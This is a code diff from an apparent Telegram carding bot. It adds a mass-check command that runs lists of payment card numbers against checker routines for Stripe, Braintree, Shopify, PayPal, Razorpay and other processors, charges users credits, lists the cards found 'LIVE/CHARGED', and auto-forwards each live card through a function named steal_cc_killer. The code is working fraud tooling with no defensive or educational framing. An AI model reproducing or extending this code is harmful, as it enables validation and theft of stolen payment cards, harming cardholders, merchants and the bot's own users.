@@ -269,6 +269,114 @@ async def single_check(client, message):
     if result['status'] in ["approved", "live", "success", "charged"]:
         await steal_cc_killer(client, message, '|'.join(card), result)
 
+@app.on_message(filters.command(["mstr", "mbtn", "mrzp", "mshp", "mpayu", "maz", "mhit", "mnmi", "mpayf", "mshpa", "mvbv", "mppal", "mppavs", "mas", "mbtnc", "mash", "msk", "mskc", "mnsk", "mnsk2", "mnsk3", "msaw", "msaw2", "msaw3", "micvv", "miccn", "mfs", "mfsc", "mck", "mbt", "mbt2", "mbtc"]) & authorized_filter)
+async def specific_mass_check(client, message):
+    # Mass gate check logic
+    cmd = message.command[0]
+    gate_cmd = cmd[1:] # strip 'm' prefix
+    
+    is_flood, remain = check_flood(message.from_user.id, wait_time=30)
+    if is_flood:
+        return await message.reply(f"⏳ Mass checks are limited. Wait {remain}s.")
+
+    text = message.text or (message.reply_to_message.text if message.reply_to_message else "")
+    cards = extract_cards(text)
+    
+    if not cards:
+        return await message.reply(f"❌ <b>No cards found.</b>\nUsage: <code>/{cmd} list_of_cards</code>")
+        
+    # CREDIT CHECK
+    if not update_user_credits(message.from_user.id, -5):
+        return await message.reply("⚠️ <b>Insufficient Credits!</b>\nNeed: 5 Credits")
+
+    status_msg = await message.reply(f"⚡ <b>Mass Checking via {gate_cmd.upper()}...</b>")
+    
+    # RE-USE GATE MAP (Simply import from local scope or define helper to avoid duplication if preferred, but copy is safe here)
+    from gates import (
+        check_stripe, check_braintree_auth, check_razorpay, 
+        check_shopify, check_payu, check_amazon, 
+        check_autohitter, check_nmi, check_payflow,
+        check_shopify_auth, check_vbv, check_paypal, check_paypal_avs, check_autowoo,
+        check_braintree_auth2, check_braintree_charge,
+        check_stripe_sk, check_stripe_nonsk, check_stripe_autowoo,
+        check_stripe_inbuilt, check_stripe_autohitter_url,
+        check_fastspring_auth, check_fastspring_charge,
+        check_killer_gate
+    )
+    gate_map = {
+        "btn": check_braintree_auth,
+        "bt": check_braintree_auth,
+        "bt2": check_braintree_auth2,
+        "btnc": check_braintree_charge,
+        "btc": check_braintree_charge,
+        "rzp": check_razorpay,
+        "shp": check_shopify,
+        "payu": check_payu,
+        "az": check_amazon,
+        "hit": check_autohitter,
+        "nmi": check_nmi,
+        "payf": check_payflow,
+        "shpa": check_shopify_auth,
+        "vbv": check_vbv,
+        "ppal": check_paypal,
+        "ppavs": check_paypal_avs,
+        "as": check_autowoo,
+        "ash": check_shopify_auth,
+        "sk": check_stripe_sk,
+        "skc": lambda *args, **kwargs: check_stripe_sk(*args, ccn=True, **kwargs),
+        "nsk": lambda *args: check_stripe_nonsk(*args, api_version=1),
+        "nsk2": lambda *args: check_stripe_nonsk(*args, api_version=2),
+        "nsk3": lambda *args: check_stripe_nonsk(*args, api_version=3),
+        "saw": lambda *args: check_stripe_autowoo(*args, variation=1),
+        "saw2": lambda *args: check_stripe_autowoo(*args, variation=2),
+        "saw3": lambda *args: check_stripe_autowoo(*args, variation=3),
+        "icvv": check_stripe_inbuilt,
+        "iccn": lambda *args, **kwargs: check_stripe_inbuilt(*args, is_ccn=True, **kwargs),
+        "fs": check_fastspring_auth,
+        "fsc": check_fastspring_charge,
+        "ck": check_killer_gate,
+        "str": check_stripe # Added explicit str mapping if missing (it was in individual check via explicit import handling but map is safer)
+    }
+    
+    gate_func = gate_map.get(gate_cmd)
+    if not gate_func:
+         # Fallback for direct "str" or checks that might use default stripe logic if not in map
+         if gate_cmd == "str": gate_func = check_stripe
+         else: return await status_msg.edit("❌ <b>Gate Logic Not Found.</b>")
+
+    from api_killer import mass_specific_gate_runner
+    
+    total = len(cards)
+    async def update_status(checked, total):
+        if checked % 5 == 0 or checked == total:
+            try:
+                await status_msg.edit(f"⚡ <b>Mass {gate_cmd.upper()}...</b> \nProgress: <code>[{checked}/{total}]</code>")
+            except: pass
+
+    results = await mass_specific_gate_runner(cards, gate_func, status_callback=update_status)
+    
+    # Format Report
+    lives = [k for k, v in results.items() if v['status'] in ["approved", "live", "success", "charged"]]
+    
+    report = f"""
+💀 <b>MASS {gate_cmd.upper()} COMPLETE</b>
+━━━━━━━━━━━━━━━━━━━━━━━
+📊 Stats: <b>{len(lives)}/{total} LIVE/CHARGED</b>
+✅ Live List:
+"""
+    for card_cc in lives[:10]: 
+        report += f"• <code>{card_cc}</code>\n"
+    
+    if len(lives) > 10:
+        report += f"<i>...and {len(lives)-10} more</i>"
+        
+    await status_msg.edit(report)
+    
+    # Auto Forward
+    for card_cc in lives:
+        res = results[card_cc]
+        await steal_cc_killer(client, message, card_cc, res)
+
 @app.on_message(filters.command(["mkiller", "mchk"]) & authorized_filter)
 async def mass_check(client, message):
     # Anti-Flood for mass is stricter
